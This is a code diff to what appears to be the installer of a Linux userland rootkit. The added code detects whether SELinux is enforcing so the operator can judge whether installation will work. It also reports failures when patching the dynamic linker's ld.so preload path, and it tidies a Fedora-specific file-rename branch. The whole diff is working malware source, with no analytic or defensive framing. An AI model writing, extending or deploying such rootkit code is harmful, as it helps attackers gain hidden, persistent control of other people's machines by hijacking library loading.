@@ -7,8 +7,62 @@ void bignope(int p){
     exit(0);
 }
 
+#define SECONFIG "/etc/selinux/config"
+static char *const noselinux[2] = {"SELINUX=enforcing", "SELINUX=permissive"};
+
+int anselinux(void){
+    int acc;
+    hook(CACCESS);
+    acc = (long)call(CACCESS, SECONFIG, F_OK);
+    if(acc != 0 && errno == ENOENT) return 0;
+    else if(acc != 0){
+        printf("access failed on: %s\n", SECONFIG);
+        return -1;
+    }
+    return 1;
+}
+
+int chkselinux(void){
+    FILE *fp;
+    int badselinux=0;
+
+    hook(CFOPEN);
+
+    fp = call(CFOPEN, SECONFIG, "r");
+    if(fp == NULL){
+        printf("Failed trying to open %s for reading.\n", SECONFIG);
+        return -1;
+    }
+
+    char line[LINE_MAX];
+    memset(line, 0, sizeof(line));
+
+    while(fgets(line, sizeof(line), fp) != NULL && !badselinux)
+        for(int i=0; i!=sizeofarr(noselinux) && !badselinux; i++)
+            if(!strncmp(noselinux[i], line, strlen(noselinux[i])))
+                badselinux=1;
+
+    fclose(fp);
+
+    return badselinux;
+}
+
 void bdvinstall(char *const argv[]){
     dorolf();
+
+    int selinux = anselinux();
+    if(selinux < 0){
+        printf("Failed to determine if SELinux is present or not.\n");
+        exit(0);
+    }else if(selinux){
+        printf("SELinux present. Going to determine status.\n");
+        if(chkselinux()){
+            printf("SELinux is enabled on this machine! This is not good!\n");
+            printf("I HIGHLY advise against continuing installation...\n");
+            printf("Otherwise press enter to continue...\n");
+            getchar();
+        }else printf("SELinux is disabled. Good.\n");
+    }else printf("No SELinux.\n");
 
     int fedora=0;
     if(isfedora())
@@ -46,8 +100,6 @@ void bdvinstall(char *const argv[]){
             }
 
             if(fedora){
-                printf("Fedora box.\n");
-
                 hook(CRENAME);
                 if((long)call(CRENAME, npath, PLAINSOPATH) < 0){
                     printf("Rename failed: %s -> %s\n", npath, PLAINSOPATH);
@@ -60,10 +112,7 @@ void bdvinstall(char *const argv[]){
 
             if(fedora)
                 break;
-        }else{
-            printf("NO\n");
-            bignope(0);
-        }
+        }else bignope(0);
     }
 
     if(rknomore()){
@@ -78,6 +127,10 @@ void bdvinstall(char *const argv[]){
     int p=ldpatch(OLD_PRELOAD, preloadpath);
     if(p < 0){
         printf("Something has went horribly wrong...\n");
+        if(p == -2)
+            printf("%s could not be located in ld.so.\n", OLD_PRELOAD);
+        if(p == -3)
+            printf("Failed allocating memory for ld.so paths.\n");
         // ...
         bignope(0);
     }else if(p > 0) printf("Patched ld.so: \e[1;31m%d\e[0m\n", p);
